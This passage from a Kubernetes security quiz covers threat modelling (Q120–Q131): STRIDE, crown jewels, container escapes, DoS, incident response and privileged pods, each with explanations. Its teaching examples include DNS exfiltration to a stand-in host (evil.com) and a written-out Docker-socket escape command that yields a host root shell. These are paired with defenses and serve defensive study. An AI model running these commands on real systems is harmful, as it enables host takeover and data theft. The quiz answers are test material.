                                                  pod → DENIED

  ⑤ Collection       SELECT * FROM users;         DB audit logging (pgaudit):
                     Dump all PII data            full query log alerts on
                                                  mass reads outside app hours

  ⑥ Exfiltration     DNS: data.evil.com           Egress NP: only DNS to CoreDNS
                     chunk1.evil.com              → blocked OR DNS inspection
                                                  detects abnormal query patterns

For anihpj/jobpost: This exact kill chain is used in the security team's tabletop exercises. They walk through the scenario quarterly, testing each defense layer. The goal: ensure at least 3 of the 6 defense stages would independently stop the attack (defense-in-depth validated).

Threat Model Q120 of 200
What is STRIDE threat modeling?
A) STRIDE categorizes threats into 6 types: Spoofing (pretending to be someone else — stolen kubeconfig), Tampering (modifying code/data — malicious image), Repudiation (denying actions — deleting audit logs), Information Disclosure (leaking data — reading Secrets), Denial of Service (making services unavailable — resource exhaustion), Elevation of Privilege (gaining higher access — container escape). For each trust boundary in your system, ask: "Could an attacker do [S/T/R/I/D/E] here?"
B) STRIDE is an automated threat scanning tool for Kubernetes
C) STRIDE is a compliance framework like SOC2 or ISO 27001
D) STRIDE is the Linux Foundation's official KCSA exam methodology
✅ Correct Answer: A

STRIDE is Microsoft's threat categorization model. For each component and trust boundary in your system, you ask: could an attacker Spoof identity? Tamper with data? Repudiate actions? Disclose Information? Cause Denial of Service? Gain Elevation of Privilege? Each STRIDE category maps to specific Kubernetes controls: Spoofing → mTLS + OIDC, Tampering → image signing, Repudiation → audit logs, Info Disclosure → etcd encryption, DoS → ResourceQuota, Elevation → Pod Security Standards.

📝 Detailed Explanation
STRIDE Applied to anihpj/jobpost
  ┌──────────────────────────────────────────────────────────────────┐
  │ STRIDE CATEGORY    │ THREAT EXAMPLE           │ K8s CONTROL      │
  ├──────────────────────────────────────────────────────────────────┤
  │ S - Spoofing       │ Attacker steals dev's    │ OIDC + MFA      │
  │                    │ kubeconfig → runs cmds   │ Short-lived     │
  │                    │ as that developer        │ tokens          │
  ├──────────────────────────────────────────────────────────────────┤
  │ T - Tampering      │ Attacker replaces        │ Cosign image    │
  │                    │ anihpj-api image in      │ signing +       │
  │                    │ registry                 │ Rekor log       │
  ├──────────────────────────────────────────────────────────────────┤
  │ R - Repudiation    │ Attacker deletes audit   │ Audit logs      │
  │                    │ logs to hide kubectl     │ shipped off-    │
  │                    │ delete deployment        │ cluster (S3)    │
  ├──────────────────────────────────────────────────────────────────┤
  │ I - Info Discl.    │ Attacker reads Secrets   │ etcd encryption │
  │                    │ from etcd (plaintext)    │ + KMS + RBAC    │
  ├──────────────────────────────────────────────────────────────────┤
  │ D - Denial of Svc  │ Pod without limits       │ ResourceQuota + │
  │                    │ consumes all node CPU    │ LimitRange      │
  ├──────────────────────────────────────────────────────────────────┤
  │ E - Elevation      │ Container escape via     │ runAsNonRoot +  │
  │                    │ privileged pod           │ drop ALL caps   │
  │                    │                          │ + seccomp       │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The threat model document has a STRIDE table for every trust boundary: Internet→Ingress, Ingress→Web, Web→API, API→DB, API→Redis. Each cell has the threat, likelihood, impact, and existing controls. The table is reviewed before every production deployment.

Threat Model Q121 of 200
What are the "crown jewels" in anihpj/jobpost and how do you prioritize protecting them?
A) The Kubernetes cluster itself — losing the cluster means losing everything
B) ① User PII in PostgreSQL (names, emails, resumes — GDPR/CCPA implications), ② Django SECRET_KEY (can forge sessions + reset passwords + sign CSRF tokens — total app compromise), ③ API auth tokens (JWT secrets, OAuth keys), ④ Payment data (PCI-DSS scope), ⑤ Source code (intellectual property). Prioritize by impact: PII leak = regulatory fines + reputation loss; SECRET_KEY leak = complete application takeover
C) The container images are the most valuable — without them, nothing runs
D) All data is equally important — treat everything with the same security level
✅ Correct Answer: B

Risk-based prioritization means protecting the highest-impact assets first. For anihpj/jobpost: user PII in PostgreSQL is a regulatory risk (GDPR fines up to €20M or 4% of revenue), Django SECRET_KEY is a total application compromise (forged sessions = impersonate any user including admin, forged password reset tokens = account takeover), JWT secrets enable API impersonation. The cluster, images, and source code are important but REPLACEABLE — user data and cryptographic keys are NOT.

📝 Detailed Explanation
Crown Jewels — Risk-Based Prioritization
  ┌──────────────────────────────────────────────────────────────┐
  │ ASSET              │ IMPACT OF COMPROMISE    │ PRIORITY     │
  ├──────────────────────────────────────────────────────────────┤
  │ User PII (DB)      │ GDPR fines, reputation  │ 🔴 CRITICAL  │
  │                    │ loss, lawsuits, churn   │              │
  ├──────────────────────────────────────────────────────────────┤
  │ Django SECRET_KEY  │ Session forgery, CSRF   │ 🔴 CRITICAL  │
  │                    │ bypass, password reset  │              │
  │                    │ token forgery           │              │
  ├──────────────────────────────────────────────────────────────┤
  │ JWT signing key    │ API impersonation,      │ 🟠 HIGH      │
  │                    │ unauthorized data access│              │
  ├──────────────────────────────────────────────────────────────┤
  │ DB/Redis passwords │ Direct database access, │ 🟠 HIGH      │
  │                    │ cache poisoning         │              │
  ├──────────────────────────────────────────────────────────────┤
  │ Source code        │ IP theft, vuln discovery│ 🟡 MEDIUM    │
  ├──────────────────────────────────────────────────────────────┤
  │ CI/CD credentials  │ Malicious deployments   │ 🟡 MEDIUM    │
  ├──────────────────────────────────────────────────────────────┤
  │ Cluster config     │ Rebuildable from IaC    │ 🟢 LOW       │
  └──────────────────────────────────────────────────────────────┘

  PROTECTION ORDER: Encrypt PII at rest+transit FIRST,
  then lock down SECRET_KEY, then API tokens, then infra.

For anihpj/jobpost: The PostgreSQL volume is encrypted with KMS, the SECRET_KEY is in AWS Secrets Manager with automatic rotation, JWT keys are in HashiCorp Vault, and database passwords rotate quarterly. Protection effort is proportional to asset criticality — critical assets get defense-in-depth (encryption + access control + audit + alerting), low-priority assets get baseline controls.

4.2 PersistenceQ122–Q125

Threat Model Q122 of 200
What is a "container escape" and why is it the worst-case scenario?
A) A container stopping unexpectedly due to an out-of-memory (OOM) kill
B) An attacker accessing the container's application logs — they can see debug output
C) When a process inside a container breaks out of its isolation (namespaces, cgroups) and gains access to the HOST operating system. Once on the host, the attacker can access ALL containers' filesystems, steal node-level credentials (kubelet certs, cloud metadata), install kernel-level malware, and pivot to attack other nodes — it's total node compromise
D) A Kubernetes feature that allows containers to migrate between nodes
✅ Correct Answer: C

Container escape is the nuclear scenario in container security. The attacker bypasses Linux namespaces (which provide the illusion of isolation) and cgroups (which limit resources) to reach the host kernel and filesystem. Since containers share the host kernel (unlike VMs), a kernel vulnerability or misconfiguration can grant host-level access. Once on the host: all containers on that node are compromised, kubelet credentials can be stolen, cloud metadata endpoint (169.254.169.254) reveals IAM credentials, and the attacker can move laterally to other nodes.

📝 Detailed Explanation
Container Escape — Breaking Isolation
  NORMAL ISOLATION:                    ESCAPE: Host Compromise
  ┌──────────────────┐                ┌──────────────────────────┐
  │ Container A      │                │ Container A (attacker)   │
  │ (namespaces: net,│                │                          │
  │  pid, mnt, uts)  │                │ Exploit: --privileged or │
  │     ↓ kernel     │                │ CVE-2019-5736 (runc) or  │
  │ ┌──────────────┐ │                │ CAP_SYS_ADMIN abuse      │
  │ │ HOST KERNEL  │ │                │         ↓                │
  │ └──────────────┘ │                │ ┌──────────────────────┐ │
  │     ↑ kernel     │                │ │ HOST (COMPROMISED!)  │ │
  │ Container B      │                │ │ • /proc → all procs  │ │
  │                  │                │ │ • /var/lib/docker →  │ │
  │ Containers see   │                │ │   all containers     │ │
  │ only their own   │                │ │ • kubelet certs →    │ │
  │ namespaces ✓     │                │ │   API server access  │ │
  └──────────────────┘                │ │ • 169.254.169.254 →  │ │
                                       │ │   cloud IAM creds   │ │
  PREVENTION:                          │ └──────────────────────┘ │
  • runAsNonRoot                       └──────────────────────────┘
  • drop ALL capabilities
  • readOnlyRootFilesystem
  • seccomp: RuntimeDefault
  • NEVER --privileged
  • Sandbox runtime: gVisor or Kata

For anihpj/jobpost: All application pods run with the Restricted Pod Security Standard — no privileged mode, no host mounts, no dangerous capabilities. For CI/CD pipelines that build untrusted code, pods run under gVisor (user-space kernel sandbox) — even if the container escapes, it's trapped in the Sentry sandbox, not the real host kernel.

Threat Model Q123 of 200
What are the most common container escape techniques?
A) Looking at other containers' logs — that's the only way to "escape"
B) Sending too many HTTP requests to crash the container
C) Container escape only works on Windows containers — Linux containers are fully isolated
D) ① Privileged container (--privileged gives all caps + all host devices — mount host / as volume), ② Mounting /var/run/docker.sock (control host Docker daemon — launch privileged containers on host), ③ CAP_SYS_ADMIN + mount (allows pivot_root, mount operations that break out), ④ Kernel exploits (Dirty Cow, Dirty Pipe — shared kernel vulnerability), ⑤ /proc or /sys mounted without protection (modify kernel params)
✅ Correct Answer: D

The most common escape vectors all involve breaking the shared kernel boundary. Privileged containers are the easiest — --privileged grants ALL capabilities and access to ALL host devices; one mount /dev/sda1 /mnt and the host filesystem is yours. The Docker socket attack is terrifying: mount /var/run/docker.sock → run docker run --privileged -v /:/host alpine → you now have a root shell on the host. Kernel exploits (Dirty Pipe, CVE-2022-0847) affect ALL containers because they share the kernel.

📝 Detailed Explanation
The Docker Socket Attack — 3 Command Host Compromise
  ┌──────────────────────────────────────────────────────────────────┐
  │  ATTACKER'S 3-COMMAND HOST TAKEOVER:                            │
  │                                                                  │
  │  ① Pod has /var/run/docker.sock mounted:                        │
  │     volumes:                                                     │
  │     - name: docker-sock                                         │
  │       hostPath:                                                  │
  │         path: /var/run/docker.sock  ← DO NOT DO THIS            │
  │                                                                  │
  │  ② Attacker inside pod runs:                                    │
  │     $ docker run -d --privileged \                              │
  │         --net=host --pid=host \                                  │
  │         -v /:/host \                                             │
  │         alpine chroot /host                                      │
  │                                                                  │
  │  ③ Attacker now has:                                            │
  │     • Root shell on HOST (chroot into host rootfs)              │
  │     • Access to all containers' filesystems                     │
  │     • kubelet certs → API server access as the node              │
  │     • Cloud metadata → cloud IAM credentials                    │
  │                                                                  │
  │  TOTAL TIME: < 10 seconds. TOTAL DAMAGE: Complete node takeover. │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Pod Security Standards (Restricted) block ALL of these: no privileged containers, no hostPath volumes, no CAP_SYS_ADMIN. The CI/CD namespace (which needs elevated access for image building) uses Kaniko instead of Docker-in-Docker — Kaniko builds images in userspace without needing the Docker socket. No docker.sock mount = Docker socket attack impossible.

Threat Model Q124 of 200
How do you prevent container escapes?
A) NEVER use --privileged (unless absolutely unavoidable — reconsider first), drop ALL capabilities + add back only needed ones, set allowPrivilegeEscalation: false, use readOnlyRootFilesystem: true, NEVER mount docker.sock or host /, use seccomp RuntimeDefault, use AppArmor/SELinux profiles, run as non-root, and consider sandboxed runtimes (gVisor/Kata) for untrusted workloads
B) Container escapes cannot be prevented — they're inherent to container technology
C) Just use the latest kernel version — kernel patches prevent all escapes
D) Container escapes are a myth — containers are as secure as VMs by default
✅ Correct Answer: A

Container escape prevention is a layered defense. No single control is sufficient. The layers: ① Pod Security Context: runAsNonRoot, drop ALL caps, readOnlyRootFilesystem — prevents most escapes. ② seccomp: RuntimeDefault blocks ~40 dangerous syscalls (mount, pivot_root, clone3, unshare). ③ AppArmor/SELinux: file path and operation restrictions. ④ Sandboxed runtime: gVisor (user-space kernel) or Kata (lightweight VM) — even if the container "escapes", it's trapped in the sandbox. ⑤ Kernel updates: patch known escape CVEs immediately.

📝 Detailed Explanation
Container Escape — Defense-in-Depth Layers
  LAYER 1: Pod Security Context (PREVENT)
  ┌──────────────────────────────────────────────────────────────┐
  │ runAsNonRoot: true         → can't be UID 0 on host          │
  │ allowPrivilegeEscalation: false → no setuid binaries         │
  │ capabilities.drop: [ALL]   → no CAP_SYS_ADMIN, no mount      │
  │ readOnlyRootFilesystem: true → can't write exploits          │
  └──────────────────────────────────────────────────────────────┘
                           ↓ (if Layer 1 bypassed)
  LAYER 2: seccomp + AppArmor (RESTRICT)
  ┌──────────────────────────────────────────────────────────────┐
  │ seccomp: RuntimeDefault     → blocks 40+ dangerous syscalls  │
  │ AppArmor: deny /proc/sys/**, deny mount, deny pivot_root     │
  └──────────────────────────────────────────────────────────────┘
                           ↓ (if Layer 2 bypassed)
  LAYER 3: Sandboxed Runtime (CONTAIN)
  ┌──────────────────────────────────────────────────────────────┐
  │ gVisor: user-space kernel → "escape" hits Sentry sandbox     │
  │ Kata Containers: per-pod VM → "escape" hits VM boundary      │
  └──────────────────────────────────────────────────────────────┘
                           ↓ (if Layer 3 bypassed)
  LAYER 4: Kernel hardening + patching
  ┌──────────────────────────────────────────────────────────────┐
  │ Updated kernel, kexec disabled, /proc/sys restrictions       │
  └──────────────────────────────────────────────────────────────┘

For anihpj/jobpost: All 4 layers are deployed. Application pods use Layers 1+2 (sufficient for trusted workloads). CI/CD pods use Layer 3 (gVisor — untrusted code may be built). The host kernel is patched within 24 hours of CVE announcements via automated node rolling updates (Layer 4).

Threat Model Q125 of 200
What's the difference between gVisor, Kata Containers, and Firecracker for sandboxed runtimes?
A) They're all the same — just different names for the same technology
B) gVisor (Google): user-space kernel (Sentry) written in Go — intercepts syscalls, ~200 safe ones reach real kernel. Lightweight, fast startup. Kata Containers: each pod gets a DEDICATED lightweight VM (QEMU or Firecracker) with its OWN kernel — strongest isolation but higher overhead. Firecracker (AWS): microVM technology used by Lambda/Fargate — boots in 125ms, minimal device model, used as VMM by Kata
C) gVisor is for production; Kata is only for development; Firecracker is deprecated
D) They replace Docker entirely — you don't need containers anymore
✅ Correct Answer: B

Sandboxed runtimes add an extra isolation layer between the container and the host kernel. gVisor implements ~200 Linux syscalls in userspace (Sentry) — only those ~200 ever reach the real kernel; all others are intercepted. Kata Containers takes the strongest approach: each pod gets a full lightweight VM with its OWN kernel — if the container escapes, it hits the VM boundary, not the host. Firecracker is the microVM engine that Kata can use — it boots VMs in 125ms with minimal device emulation. Trade-off: stronger isolation = more overhead. Use RuntimeClass to assign per pod.

📝 Detailed Explanation
Runtime Sandboxing — Three Levels of Isolation
  ┌──────────────────────────────────────────────────────────────────┐
  │                     STRONGER ISOLATION ──────────────────────►   │
  │                                                                  │
  │  runc (default)      gVisor            Kata Containers          │
  │  ┌──────────┐       ┌──────────┐       ┌──────────────────────┐ │
  │  │ Container│       │ Container│       │ Container            │ │
  │  │   ↓      │       │   ↓      │       │   ↓ Guest Kernel     │ │
  │  │  Kernel  │       │ Sentry   │       │   ↓ QEMU/Firecracker │ │
  │  │  (host)  │       │ (Go,user)│       │   ↓ Host Kernel      │ │
  │  │          │       │   ↓      │       │                      │ │
  │  │          │       │  Kernel  │       │                      │ │
  │  │          │       │  (host,  │       │                      │ │
  │  │          │       │  ~200    │       │                      │ │
  │  │          │       │  syscalls│       │                      │ │
  │  └──────────┘       └──────────┘       └──────────────────────┘ │
  │  Syscalls: ~300+    Syscalls: ~200     Syscalls: ALL (own kernel)│
  │  Overhead: none     Overhead: ~5-10%   Overhead: ~15-25%        │
  │  Boot: instant      Boot: ~100ms       Boot: ~125ms (Firecracker)│
  │  Isolation: shared  Isolation: user-   Isolation: HARDWARE VM   │
  │             kernel         space kernel                          │
  └──────────────────────────────────────────────────────────────────┘

  RuntimeClass: spec.runtimeClassName: "kata" or "gvisor"

For anihpj/jobpost: Application pods use runc (fast, secure enough with other controls). CI/CD pods use gVisor (builds untrusted code — sandboxing prevents escape). If anihpj/jobpost handled financial transactions (PCI-DSS), the payment-processing pods would use Kata Containers (VM-level isolation required by some compliance standards). RuntimeClass enables this per-pod flexibility.

4.3 Denial of ServiceQ126–Q130

Threat Model Q126 of 200
What are Denial-of-Service (DoS) risks in Kubernetes?
A) Kubernetes is immune to DoS attacks because of its distributed architecture
B) Only external DDoS attacks matter — internal cluster behavior can't cause DoS
C) DoS is only a network-layer concern — handled by cloud provider firewalls
D) ① Resource exhaustion: pod without limits uses all node CPU/memory → OOMKiller evicts pods, ② etcd overload: too many writes → latency spikes → API server slow → cluster unusable, ③ API server DoS: flood of unauthenticated requests to port 6443, ④ DNS DoS: flood of queries to CoreDNS → DNS resolution fails → services unreachable, ⑤ Disk exhaustion: container logs fill node disk → kubelet can't write → node NotReady
✅ Correct Answer: D

Kubernetes has multiple DoS vectors at different layers. At the node level: pods without resource limits can consume all CPU/memory, causing the OOMKiller to evict critical pods. At the control plane level: too many concurrent writes can overwhelm etcd (RAFT consensus slows down), making the API server unresponsive. At the network level: CoreDNS overload or API server request flooding can make the cluster unmanageable. At the storage level: container logs filling up disk space can make the node NotReady. Each requires different mitigations.

📝 Detailed Explanation
Kubernetes DoS Vectors — Five Attack Surfaces
  ┌──────────────────────────────────────────────────────────────────┐
  │ DoS VECTOR            │ CAUSE                │ MITIGATION        │
  ├──────────────────────────────────────────────────────────────────┤
  │ Resource Exhaustion   │ Pod without limits    │ ResourceQuota +   │
  │ (Node Level)          │ uses all node CPU/mem │ LimitRange        │
  │                       │ → OOMKiller eviction  │ (MANDATORY)       │
  ├──────────────────────────────────────────────────────────────────┤
  │ etcd Overload         │ 1000 pods rapidly     │ API Priority +    │
  │ (Control Plane)       │ creating/deleting     │ Fairness, rate    │
  │                       │ → etcd latency spikes │ limiting,         │
  │                       │ → API server slow     │ --max-requests-   │
  │                       │                       │ inflight          │
  ├──────────────────────────────────────────────────────────────────┤
  │ API Server DoS        │ Flood of requests     │ --max-requests-   │
  │ (Control Plane)       │ to port 6443          │ inflight, network │
  │                       │ (auth or unauth)      │ firewall, WAF     │
  ├──────────────────────────────────────────────────────────────────┤
  │ DNS DoS               │ Flood of DNS queries  │ CoreDNS auto-     │
  │ (Network)             │ → CoreDNS overwhelmed │ scaling, NodeLocal│
  │                       │ → service resolution  │ DNSCache, caching │
  │                       │ fails                 │                  │
  ├──────────────────────────────────────────────────────────────────┤
  │ Disk Exhaustion       │ Container logs fill   │ Log rotation,      │
  │ (Node Level)          │ node disk → kubelet   │ max log size,     │
  │                       │ can't write → NotReady│ separate partition│
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Every namespace has ResourceQuota + LimitRange (prevents resource exhaustion). API Priority and Fairness is configured (critical controllers get guaranteed throughput). CoreDNS has NodeLocal DNSCache on every node (reduces CoreDNS load by 90%). Container logs are rotated at 100MB with max 5 files. Disk monitoring alerts at 80% capacity.

Threat Model Q127 of 200
What should you do if you DETECT a security breach in your Kubernetes cluster? (First 5 minutes)
A) ① ISOLATE: Cordon affected node → no new pods, ② CONTAIN: Emergency NetworkPolicy blocking all egress from affected namespace (prevent data exfiltration), ③ PRESERVE EVIDENCE: etcd snapshot + download pod logs + audit logs + Falco events, ④ IDENTIFY: What was accessed? Which SA tokens compromised? ⑤ REVOKE: Delete compromised SA tokens, rotate Secrets, revoke cloud IAM credentials. Contain FIRST, investigate later
B) Immediately delete the affected namespace to stop the attack — investigate later
C) Call the cloud provider — they handle all security incidents
D) Take the cluster offline completely by shutting down all nodes
✅ Correct Answer: A

Incident response for Kubernetes follows the "Contain First, Investigate Later" principle. Your immediate priority is to STOP the bleeding (prevent data exfiltration, prevent lateral movement, prevent privilege escalation). THEN preserve evidence for forensic analysis. DO NOT just delete resources — you'll destroy forensic evidence and potentially trigger attacker retaliation (e.g., ransomware that detonates on pod deletion). Isolate the affected blast radius, capture the state, then methodically investigate and remediate.

📝 Detailed Explanation
Incident Response — First 5 Minutes Flowchart
  ┌──────────────────────────────────────────────────────────────┐
  │ 🚨 ALERT: Falco detects reverse shell in anihpj-api pod     │
  └────────────────────────────┬─────────────────────────────────┘
                               ▼
  ⏱️ 0:00-0:30  ISOLATE: kubectl cordon <node> → no new pods
  ⏱️ 0:30-1:00  CONTAIN: Apply emergency egress-deny NP to
                         anihpj namespace → stop data exfil
  ⏱️ 1:00-2:00  PRESERVE: etcd snapshot + kubectl logs + audit
                          logs export + Falco event dump
  ⏱️ 2:00-3:00  IDENTIFY: Check audit logs → what did the
                           compromised SA access?
  ⏱️ 3:00-4:00  REVOKE: Delete compromised SA tokens, rotate
                         Secrets in anihpj namespace
  ⏱️ 4:00-5:00  TRIAGE: Is data exfiltration confirmed? Was
                         the blast radius contained?
  ⏱️ 5:00+      REMEDIATE: Restore from clean backup, verify
                           no backdoors, post-mortem analysis
  └──────────────────────────────────────────────────────────────┘

  ⚠️ DO NOT: Delete pods (lose evidence), shut down cluster
             (can't investigate), panic and make changes blindly

For anihpj/jobpost: The incident response runbook is rehearsed quarterly. Emergency NetworkPolicies are pre-staged as commented-out YAML (just uncomment and apply). etcd snapshots are taken every 4 hours automatically. The security on-call engineer has a laminated checklist: "1. Cordon. 2. Contain. 3. Preserve. 4. Identify. 5. Revoke."

Threat Model Q128 of 200
What is the "blast radius" concept and how do you minimize it?
A) The blast radius is the physical damage radius if a data center explodes
B) Blast radius = the amount of damage a single compromise can cause. Minimize via: ① Namespace isolation (each app in own namespace — compromise of namespace A doesn't affect B), ② Least privilege RBAC (SA only has permissions it needs), ③ NetworkPolicy (restrict pod-to-pod communication), ④ Pod Security Standards (prevent escape), ⑤ Dedicated ServiceAccounts (compromised SA doesn't give access to other SAs' permissions)
C) The blast radius is fixed — it's always the entire cluster
D) You can't minimize blast radius — Kubernetes provides no isolation mechanisms
✅ Correct Answer: B

Blast radius is the scope of damage from a single compromise. A pod running as cluster-admin that can reach all databases = entire cluster blast radius. A pod running with no API access, restricted to only its database on port 5432 = single-pod blast radius. The goal is to shrink the blast radius as small as possible through namespace isolation, least privilege, network segmentation, and workload-specific ServiceAccounts. The question to ask: "If THIS pod is compromised, what can the attacker reach?"

📝 Detailed Explanation
Blast Radius — Large vs Small
  LARGE BLAST RADIUS (💥 ENTIRE CLUSTER):      SMALL BLAST RADIUS (🎯 SINGLE POD):
  ┌──────────────────────────────────┐        ┌──────────────────────────────┐
  │ SA: default (cluster-admin)      │        │ SA: anihpj-api (minimal)      │
  │ NetworkPolicy: none (allow-all)  │        │ NetworkPolicy: only api→db    │
  │ Namespace: default (shared)      │        │ Namespace: anihpj (isolated)  │
  │ Pod: root + privileged           │        │ Pod: non-root + drop ALL caps │
  │                                  │        │                              │
  │ Compromise → attacker:           │        │ Compromise → attacker:        │
  │ ✅ List all pods (all ns)       │        │ ❌ No K8s API access (no SA)  │
  │ ✅ Read all Secrets (all ns)    │        │ ❌ Can't reach other ns (NP)  │
  │ ✅ Access all DBs (no NP)       │        │ ❌ Can't reach internet (NP)  │
  │ ✅ Deploy backdoor pods         │        │ ❌ Can't deploy pods (RBAC)   │
  │ ✅ Escape to host (privileged)  │        │ ❌ Can't escape (drop ALL)    │
  │ ✅ Steal cloud IAM credentials  │        │ ✅ Can access DB:5432 only    │
  │                                  │        │                              │
  │ RESULT: TOTAL CLUSTER LOSS       │        │ RESULT: DB access only,      │
  │                                  │        │ no lateral movement possible │
  └──────────────────────────────────┘        └──────────────────────────────┘

For anihpj/jobpost: The blast radius analysis is part of every deployment review. The anihpj-api SA has zero Kubernetes API permissions (automountServiceAccountToken: false). NetworkPolicy restricts it to only anihpj-db:5432 and anihpj-redis:6379. Pod Security Standards are Restricted. If anihpj-api is compromised, the blast radius is: the api pod + database access via application credentials. The attacker cannot read Secrets, deploy backdoors, access other namespaces, or escape to the host.

Threat Model Q129 of 200
What is the difference between a "threat" and a "vulnerability"?
A) They are synonyms — both mean the same thing
B) A threat is a software bug; a vulnerability is an attacker
C) Vulnerability = a WEAKNESS in your system (e.g., runAsUser: 0, no NetworkPolicy, Secrets in plaintext) — it's a property of YOUR configuration. Threat = a POTENTIAL ATTACK that exploits a vulnerability (e.g., an attacker exploiting root access to escape the container) — it's external. Risk = Vulnerability × Threat × Impact
D) Threats are only theoretical; vulnerabilities are only practical
✅ Correct Answer: C

The distinction is critical for security reasoning. A vulnerability is a weakness YOU control — a missing NetworkPolicy, a root container, an unencrypted Secret. A threat is an external actor or event that could exploit that weakness. You can FIX vulnerabilities (apply NetworkPolicy, use non-root, encrypt Secrets). You can REDUCE threat likelihood (WAF, IP allowlisting, authentication). Risk = Vulnerability × Threat × Impact — reduce any factor to reduce risk.

📝 Detailed Explanation
Threat vs Vulnerability vs Risk — The Security Equation
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │   RISK = VULNERABILITY × THREAT × IMPACT                        │
  │                                                                  │
  │   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐        │
  │   │VULNERABILITY │ × │   THREAT     │ × │   IMPACT     │ = RISK │
  │   │(you control) │   │  (external)  │   │(consequence) │        │
  │   └──────────────┘   └──────────────┘   └──────────────┘        │
  │         ↓                   ↓                   ↓                │
  │   FIX it:              REDUCE it:         LIMIT it:             │
  │   • Apply NP           • WAF rules        • Least privilege RBAC│
  │   • Non-root user      • IP allowlist     • Blast radius control│
  │   • Encrypt Secrets    • Authentication   • Backup + restore    │
  │   • Drop capabilities  • Rate limiting    • Incident response   │
  │                                                                  │
  │   Example:                                                       │
  │   Vulnerability: anihpj-api runs as root with no NP              │
  │   Threat: Internet attacker scanning for open K8s dashboards     │
  │   Impact: Complete cluster takeover + PII exfiltration           │
  │   Risk: CRITICAL (high vuln × moderate threat × critical impact) │
  │                                                                  │
  │   After fix:                                                     │
  │   Vulnerability: anihpj-api runs as non-root + drop ALL + NP     │
  │   Risk: LOW (low vuln × moderate threat × moderate impact)       │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The security backlog prioritizes by risk score. A root container (vulnerability) exposed to the internet (high threat) with database access (critical impact) = P0 fix immediately. A non-root container (low vulnerability) on an internal-only service (low threat) = P3 fix this sprint. This math drives security engineering priorities.

Threat Model Q130 of 200
What is the "assume breach" mentality in Kubernetes security?
A) Assume an attacker IS already inside your cluster. Now what? Design controls that work even when perimeter defenses fail: ① Detect them (Falco alerts on anomalous behavior), ② Contain them (NetworkPolicy limits lateral movement), ③ Slow them (RBAC prevents privilege escalation), ④ Alert on them (audit logs show who accessed what), ⑤ Recover (etcd backups allow restoration). It's the opposite of "we have a firewall, we're safe."
B) Assume every deployment will be breached — so don't bother with security
C) "Assume breach" means you should breach your own cluster regularly (penetration testing)
D) It means assuming your cloud provider has already been breached
✅ Correct Answer: A

"Assume breach" is a security design philosophy: don't rely on a single perimeter defense. Instead, design your system so that even when (not if) an attacker gets in, they can do minimal damage and you can detect them quickly. This means: zero trust networking (deny all, allow specific), least privilege RBAC (even if SA token is stolen, it has minimal permissions), runtime detection (Falco watching for anomalies), and robust backup/recovery (even if everything is deleted, you can restore). It's the "seatbelt + airbag + crumple zone" approach — multiple layers protect you even when the first one fails.

📝 Detailed Explanation
Assume Breach — Design for Failure
  ┌──────────────────────────────────────────────────────────────────┐
  │  PERIMETER DEFENSE ONLY (❌ "We have a firewall, we're safe"):   │
  │                                                                  │
  │  ┌──────────────┐                                               │
  │  │   Firewall   │ ← If this fails, EVERYTHING is open            │
  │  └──────┬───────┘                                               │
  │         ▼                                                        │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │  UNPROTECTED CLUSTER (allow-all, cluster-admin, no audit) │   │
  │  │  One breach → total compromise                            │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  ASSUME BREACH (✅ "They're inside. Now what?"):                 │
  │                                                                  │
  │  ┌──────────────┐                                               │
  │  │   Firewall   │ ← Okay, they got past this                    │
  │  └──────┬───────┘                                               │
  │         ▼                                                        │
  │  ┌─────────────────┐   ┌─────────────┐   ┌──────────────┐      │
  │  │ NetworkPolicy   │ → │ RBAC blocks │ → │ Falco detects│      │
  │  │ traps attacker  │   │ kubectl     │   │ reverse shell│      │
  │  │ in one pod      │   │ commands    │   │ → alert fires│      │
  │  └─────────────────┘   └─────────────┘   └──────┬───────┘      │
  │                                                  ▼               │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │  RESPONSE: Auto-cordon node, revoke SA, snapshot etcd    │   │
  │  │  RESULT: Attack detected + contained + evidence preserved│   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Every security review starts with the question: "If an attacker is in the anihpj-api pod RIGHT NOW, what can they do?" The answer drives improvements: add egress NetworkPolicy (can't exfiltrate), add Falco rules (detect unusual processes), restrict RBAC (can't access API), enable audit logging (record everything they try). The goal: make the attacker's life miserable even AFTER they get in.

4.4 Malicious Code Execution & Compromised ApplicationsQ131–Q136

Threat Model Q131 of 200
What is a "privileged pod" and why is it the nuclear option?
A) A pod with resource requests and limits set — it gets priority scheduling
B) A pod with securityContext: privileged: true gets ALL Linux capabilities, access to ALL host devices (/dev/*), disabled seccomp/AppArmor/SELinux, and ability to modify kernel parameters. Essentially: the pod IS root on the host with no restrictions. Only system components (CNI plugins, CSI drivers) should ever run privileged — and even then, explore alternatives first
C) A pod running in the kube-system namespace — all system pods are privileged
D) A pod with more than 4 CPU cores allocated — it's "privileged" in scheduling
✅ Correct Answer: B

A privileged pod (securityContext: privileged: true) essentially runs as root on the host with ZERO restrictions. It gets ALL ~40 Linux capabilities, access to all host devices (including raw disks — mount /dev/sda1 /mnt gives full host filesystem access), and all security mechanisms (seccomp, AppArmor, SELinux) are disabled. It's the security equivalent of "disable all safeties." The ONLY legitimate use cases are system infrastructure components: CNI plugins (need to configure network interfaces), CSI drivers (need to mount volumes), and kube-proxy (needs to modify iptables).

📝 Detailed Explanation
Privileged Pod — What It Unlocks
  ┌──────────────────────────────────────────────────────────────────┐
  │  privileged: true                                                │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ GRANTS:                                                   │   │
  │  │ ✅ ALL ~40 Linux capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN...)│
  │  │ ✅ Access to ALL host devices (/dev/* including /dev/sda) │   │
  │  │ ✅ Disabled seccomp (ALL syscalls allowed)                │   │
  │  │ ✅ Disabled AppArmor (no file path restrictions)          │   │
  │  │ ✅ Disabled SELinux (no mandatory access controls)        │   │
  │  │ ✅ Can modify kernel parameters (sysctl -w ...)           │   │
  │  │ ✅ Can load kernel modules                                │   │
  │  │ ✅ Can access host filesystem via device mounts           │   │
